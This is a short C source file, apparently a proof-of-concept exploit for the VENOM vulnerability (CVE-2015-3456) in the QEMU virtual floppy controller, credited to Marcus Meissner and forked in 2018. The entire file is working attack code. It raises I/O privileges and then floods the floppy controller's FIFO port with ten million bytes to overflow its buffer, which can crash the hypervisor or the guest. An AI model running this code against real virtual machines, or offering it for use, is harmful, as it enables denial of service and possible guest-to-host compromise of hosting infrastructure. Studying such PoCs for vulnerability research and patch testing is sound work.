/*
poisonfrog.c
VENOM (CVE-2015-3456) PoC
Original Idea: Marcus Meissner
Forked by MauroEldritch - 2018
*/
#include <sys/io.h>
#include <stdio.h>
#define FIFO 0x3f5

int main() {
        printf("PoisonFrog - VENOM (CVE-2015-3456) Exploit\n");
        printf("\tMauro Eldritch | 2018\n\n");
        printf("VENOM will start to run as soon as you press any key.\n /!\\ If this is your own computer, it may hang up.\n");
        getchar();
        int i;
        iopl(3);
        outb(0x0a,0x3f5); /* READ ID */
        for (i=0;i<10000000;i++)
                outb(0x42,0x3f5); /* push */
}